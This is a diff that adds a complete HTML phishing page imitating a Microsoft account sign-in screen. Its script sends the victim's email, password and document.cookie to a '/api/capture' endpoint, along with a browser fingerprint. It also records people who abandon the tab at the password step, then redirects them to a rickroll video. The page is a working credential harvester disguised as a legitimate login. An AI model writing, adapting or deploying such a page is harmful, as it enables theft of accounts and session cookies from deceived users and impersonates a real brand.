@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { width: 100%; max-width: 440px; padding: 20px; }
+        .login-box {
+            background: white;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            border-radius: 2px;
+        }
+        .logo {
+            width: 108px;
+            height: 24px;
+            margin-bottom: 16px;
+            background: #737373;
+            mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='black' d='M0 0h9v9H0zm10 0h9v9h-9zM0 10h9v9H0zm10 0h9v9h-9z'/%3E%3C/svg%3E") center/contain no-repeat;
+            -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='black' d='M0 0h9v9H0zm10 0h9v9h-9zM0 10h9v9H0zm10 0h9v9h-9z'/%3E%3C/svg%3E") center/contain no-repeat;
+        }
+        h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
+        .input-group { margin-bottom: 16px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #8c8c8c;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus { border-color: #0067b8; }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0067b8;
+            color: white;
+            border: none;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #005a9e; }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 24px; text-align: center; color: white; font-size: 13px; }
+        .footer a { color: white; text-decoration: none; margin: 0 8px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo"></div>
+            <h2 id="headerText">Sign in</h2>
+            <form id="loginForm">
+                <div class="input-group" id="emailGroup">
+                    <input type="email" id="email" placeholder="Email, phone, or Skype" required autocomplete="off">
+                </div>
+                <div class="input-group" id="passGroup" style="display: none;">
+                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
+                </div>
+                <button type="submit" class="btn" id="submitBtn">Next</button>
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 10px; color: #666;">Signing you in...</p>
+                </div>
+            </form>
+        </div>
+        <div class="footer">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = '/api/capture';
+        const REDIRECT = 'https://web.archive.org/web/20070712065202/http://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        
+        const form = document.getElementById('loginForm');
+        const emailGroup = document.getElementById('emailGroup');
+        const passGroup = document.getElementById('passGroup');
+        const emailInput = document.getElementById('email');
+        const passInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const headerText = document.getElementById('headerText');
+
+        let step = 1;
+        let capturedEmail = '';
+
+        // Collect browser fingerprint
+        const fingerprint = {
+            screen: `${screen.width}x${screen.height}`,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'unknown',
+            userAgent: navigator.userAgent
+        };
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            if (step === 1) {
+                capturedEmail = emailInput.value;
+                step = 2;
+                
+                emailGroup.style.display = 'none';
+                passGroup.style.display = 'block';
+                headerText.textContent = 'Enter password';
+                submitBtn.textContent = 'Sign in';
+                passInput.focus();
+
+                // Send email immediately
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage: 'email',
+                        email: capturedEmail,
+                        fingerprint: fingerprint,
+                        referrer: document.referrer,
+                        time: new Date().toISOString()
+                    })
+                });
+
+            } else {
+                const password = passInput.value;
+                
+                submitBtn.style.display = 'none';
+                loading.style.display = 'block';
+
+                // Send full credentials
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage: 'credentials',
+                        email: capturedEmail,
+                        password: password,
+                        fingerprint: fingerprint,
+                        cookies: document.cookie,
+                        time: new Date().toISOString()
+                    })
+                });
+
+                // Rickroll after brief delay
+                setTimeout(() => {
+                    window.location.href = REDIRECT;
+                }, 1000);
+            }
+        });
+
+        // Capture if they try to close tab after seeing password field
+        let passwordSeen = false;
+        window.addEventListener('beforeunload', () => {
+            if (passwordSeen && step === 2 && !passInput.value) {
+                fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage: 'abandon',
+                        email: capturedEmail,
+                        message: 'Closed tab at password screen'
+                    }),
+                    keepalive: true
+                });
+            }
+        });
+    </script>
+</body>
+</html>
